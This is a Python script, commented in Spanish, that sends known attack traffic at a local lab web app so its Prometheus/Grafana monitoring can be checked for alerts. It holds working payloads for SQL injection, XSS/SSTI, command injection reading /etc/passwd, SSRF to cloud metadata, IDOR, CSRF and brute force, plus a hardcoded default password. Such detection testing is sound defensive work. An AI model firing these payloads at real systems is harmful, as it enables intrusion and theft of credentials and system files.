"""Simulacion controlada de ataques para validar la MONITORIZACION.
Genera trafico malicioso conocido contra el entorno indicado para comprobar
que Prometheus/Grafana detectan y alertan los incidentes.
Uso: python simulate_attacks.py http://localhost:5000 [usuario] [password]
Solo ejecutar contra entornos propios de laboratorio."""
import re
import sys
import time

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:5000"
USER = sys.argv[2] if len(sys.argv) > 2 else "kevin"
PASS = sys.argv[3] if len(sys.argv) > 3 else "Kev1n!SecureDev-2026"


def token(s, path="/login"):
    m = re.search(r'name="csrf_token" value="([^"]*)"', s.get(BASE + path, timeout=10).text)
    return m.group(1) if m else ""


def run(name, fn):
    codes = fn()
    print(f"[{time.strftime('%H:%M:%S')}] {name:<38} -> respuestas: {codes}")


attacker = requests.Session()
victim = requests.Session()


def sqli_login(payload):
    s = requests.Session()
    return s.post(BASE + "/login", data={"username": payload, "password": "x",
                                         "csrf_token": token(s)}, timeout=10).status_code


# 1) Inyeccion SQL en el login
run("SQL Injection en login", lambda: [
    sqli_login(p) for p in ("admin' --", "' OR 1=1 --", "admin' UNION SELECT 1,2,3,4,5 --")])

# Sesion legitima para los ataques autenticados
victim.post(BASE + "/login", data={"username": USER, "password": PASS,
                                   "csrf_token": token(victim)}, timeout=10)

run("XSS / SSTI en busqueda", lambda: [
    victim.get(BASE + "/search", params={"q": p}, timeout=10).status_code
    for p in ("<script>alert(1)</script>", "{{7*7}}", "' OR 1=1 --")])
run("Inyeccion de comandos en /ping", lambda: [
    victim.get(BASE + "/ping", params={"host": p}, timeout=15).status_code
    for p in ("127.0.0.1; cat /etc/passwd", "127.0.0.1 && id", "$(whoami)")])
run("IDOR (enumeracion de notas 1-6)", lambda: [
    victim.get(f"{BASE}/note/{i}", timeout=10).status_code for i in range(1, 7)])
run("Escalada a /admin", lambda: [victim.get(BASE + "/admin", timeout=10).status_code for _ in range(4)])
run("CSRF (POST sin token)", lambda: [
    victim.post(BASE + "/note/new", data={"title": "csrf", "content": "x"}, timeout=10).status_code
    for _ in range(3)])
run("SSRF a metadata cloud", lambda: [
    victim.get(BASE + "/fetch", params={"url": u}, timeout=10).status_code
    for u in ("http://169.254.169.254/latest/meta-data/", "file:///etc/passwd")])
# Ultimo: fuerza bruta contra la cuenta admin
run("Fuerza bruta (8 intentos a 'admin')", lambda: [
    attacker.post(BASE + "/login", data={"username": "admin", "password": f"clave{i}",
                                         "csrf_token": token(attacker)}, timeout=10).status_code
    for i in range(8)])
print("Simulacion terminada. Revisa Grafana: dashboard 'SecureDev - Seguridad en Produccion'.")
